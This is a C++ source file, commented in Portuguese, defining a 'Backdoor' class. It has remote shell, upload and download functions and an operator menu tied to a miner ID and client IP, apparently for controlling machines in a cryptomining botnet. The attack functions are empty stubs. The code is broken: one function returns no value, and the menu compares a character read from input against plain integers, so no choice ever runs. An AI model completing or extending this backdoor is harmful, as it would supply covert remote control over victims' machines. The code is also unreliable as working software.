#include "backdoor.h"
void Backdoor::shell(){
    if(this->is_server){

    }else{

    }
}


void Backdoor::upload(const char * path){
    if(this->is_server){

    }else{

    }
}


void Backdoor::download(const char *path){
    if(this->is_server){

    }else{

    }
}


std::string Backdoor::get_miner_id(){
    // Logica para pegar ID
}


std::string Backdoor::get_miner_ip(){
    return  std::string(this->client_ip);
}


void Backdoor::menu(){
    int choice;
    std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;

    std::cout << "Operações : " << std::endl;

    std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;

    choice = std::cin.get();


    if(choice == 1){
        this->shell();
    
    }else if(choice == 2){
        std::string path;
        std::cout << "Path: ";
        std::getline(std::cin, path);
         // Get path

        this->download(path.c_str());

    }else if(choice == 3){
        std::string path;
        std::cout << "Path: ";
        std::getline(std::cin, path);
        this->upload(path.c_str());
    
    }else{
        std::cout << "Comando inválido" << std::endl;
    }
}


Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
    this->sock = sock;
    this->c  = c;
    this->is_server = is_server;
    this->client_ip = ip;

    if(is_server){
        //menu();
    }
}
